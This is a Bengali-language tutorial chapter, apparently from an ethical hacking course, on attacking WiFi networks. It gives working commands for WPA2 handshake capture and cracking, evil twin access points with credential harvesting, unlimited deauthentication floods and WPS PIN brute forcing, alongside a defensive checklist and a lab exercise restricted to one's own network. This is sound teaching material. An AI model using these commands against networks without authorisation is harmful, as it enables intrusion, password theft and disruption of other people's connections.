# অধ্যায় ২১: WiFi Hacking

## সহজ কথায়:
WiFi hacking = প্রতিবেশীর WiFi password বের করার চেষ্টা নয়! এটা শেখা উচিত **নিজের network-কে secure রাখতে**। তবে হ্যাঁ, বুঝলে কীভাবে attacker WiFi crack করে।

---

## ২১.১ WPA2 Cracking — Aircrack-ng Step by Step

### Step 1: Monitor Mode চালু

```bash
# তোমার WiFi interface দেখো:
iwconfig
# wlan0 (যদি internal থাকে) বা wlan1 (USB adapter)

# Interface down:
sudo ip link set wlan0 down

# Monitor mode:
sudo airmon-ng start wlan0

# Verify:
iwconfig
# wlan0mon → mode:Monitor
```

### Step 2: Target Network খুঁজো:

```bash
# সকল WiFi network দেখো:
sudo airodump-ng wlan0mon

# Output:
# BSSID              PWR  Beacons    #Data  CH  ENC  ESSID
# AA:BB:CC:DD:EE:FF  -50    120        5    6  WPA2 MyWiFi
# 11:22:33:44:55:66  -65     89        2   11  WPA2 Neighbor
```

### Step 3: Target-এ Focus করো:

```bash
# শুধু target network capture:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# -c 6 = channel 6
# --bssid = target MAC
# -w capture = output file
```

### Step 4: Deauthentication Attack (Handshake Capture)

```bash
# Connected client-কে disconnect করাও → সে reconnect করবে → handshake capture হবে
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# -0 = deauth count (১০টা packet)
# -a = Access Point MAC
# -c = Client MAC (optional — omit করলে সব client disconnect)
```

### Step 5: Verify Handshake:

```bash
# .cap file-এ handshake আছে কিনা check:
sudo aircrack-ng capture-01.cap
# Output এ দেখাবে "1 handshake(s)" 

# Wireshark-এও check:
wireshark capture-01.cap
# Filter: eapol
# EAPOL packet ৪টা থাকলে → handshake captured
```

### Step 6: Crack the Password:

```bash
# Dictionary attack:
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Output success হলে:
# KEY FOUND! [ password123 ]
```

### GPU Cracking with Hashcat:

```bash
# .cap to .hccapx convert:
cap2hccapx capture-01.cap capture.hccapx

# Hashcat crack (GPU):
hashcat -m 22000 capture.hccapx /usr/share/wordlists/rockyou.txt

# Mask attack (if you know pattern):
hashcat -m 22000 capture.hccapx -a 3 ?l?l?l?l?l?l?l?l
```

---

## ২১.২ Evil Twin AP তৈরি

Evil Twin = Original WiFi-র exact copy (same SSID) — কিন্তু attacker-এর laptop থেকে broadcast হয়।

### How Evil Twin Works:

```
Original WiFi "CoffeeShop" (Signal: -45 dBm)
Attacker's Evil Twin "CoffeeShop" (Signal: -30 dBm — কাছাকাছি)

Victim-এর device strong signal-এ connect হবে → Attacker-এর AP!
```

### Creating Evil Twin:

```bash
# 1. Fake AP তৈরি:
# airbase-ng ব্যবহার:
sudo airbase-ng -e "CoffeeShop" -c 6 wlan0mon

# Better approach — mana (WiFi toolkit):
sudo apt install mana-toolkit
# /etc/mana-toolkit/hostapd-mana.conf edit করো

# 2. DHCP server চালাও:
sudo dhcpd -cf /etc/mana-toolkit/dhcpd.conf

# 3. Traffic forward (internet দিতে):
sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### Easy Method — Fluxion:

```bash
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
./fluxion.sh
# → Menu-driven, Evil Twin + WPA handshake capture + password harvesting
```

---

## ২১.৩ Deauthentication Attack

Deauth attack ব্যবহার = client-কে WiFi থেকে forcibly disconnect করা।

```bash
# সব client disconnect:
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0 0 = infinite deauth (Ctrl+C stop)

# Specific client:
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# MDK3 (more powerful):
sudo mdk3 wlan0mon d -c 6 -b blacklist.txt
```

### Deauth Attack Uses:
```
✅ WPA handshake capture (victim reconnect করলে)
❌ Network jamming/DoS (annoying)
✅ Testing network resilience
```

### Defense against Deauth:
```
- 802.11w (Management Frame Protection)
- WPA3 (built-in protection)
- WIDS (Wireless Intrusion Detection System)
```

---

## ২১.৪ WPS Attack

WPS = WiFi Protected Setup। ৮ digit PIN → অনেক router-এ brute force করা যায়।

```bash
# WPS check:
sudo wash -i wlan0mon
# দেখো কোন network-এ WPS Locked/Locked

# WPS crack:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Bully (newer tool):
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie Dust attack (vulnerable chipset):
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K
```

### WPS Success Rate:
```
Pixie Dust: ~60% (vulnerable router)
Brute Force: ~20% (time-consuming, PIN lock)
```

---

## ২১.৫ WiFi Security Checklist

### তোমার WiFi secure করতে:

```
✅ WPA2/WPA3 ব্যবহার করো (WEP = বাদ দাও)
✅ Strong password (min 16 char — special chars + numbers)
✅ Disable WPS (rubbish protocol)
✅ Disable SSID broadcast? (মিথ্যা安全感 — না করলেও ভালো, tools দেখেই পায়)
✅ MAC filtering? (এটা break করা easy)
✅ Update router firmware regularly
✅ Disable remote management
✅ Change default admin password (not "admin/admin")
✅ Guest network separate রাখো
✅ 5 GHz ব্যবহার করো (2.4 GHz বেশি crowded)
```

---

## 💡 ল্যাব এক্সারসাইজ

```
⚠️ শুধু নিজের network বা lab-এ! প্রতিবেশীর WiFi-তে না!

১. Monitor mode test:
   - airmon-ng start wlan0
   - airodump-ng wlan0mon
   - কতগুলো network দেখতে পাচ্ছো?

২. তোমার নিজের WiFi-র handshake capture করো:
   - airodump-ng target এ focus
   - অন্য device disconnect করে reconnect করাও (deauth নাও)
   - handshake captured? check করো

৩. WiFi security check:
   - তোমার router কোন encryption ব্যবহার করে?
   - WPS চালু আছে?
   - Default password পরিবর্তন করেছো?
```

---

## 📌 মনে রাখো

| Attack | Tool | Condition |
|--------|------|-----------|
| **WPA2 Crack** | aircrack-ng + wordlist | Handshake + weak password |
| **WPA2 Crack (GPU)** | hashcat | 10x faster |
| **Deauth** | aireplay-ng | Monitor mode |
| **Evil Twin** | airbase-ng, mana | Fake AP |
| **WPS Attack** | reaver, bully | WPS enabled + vulnerable |

**পরবর্তী — Password Security! 🔑**
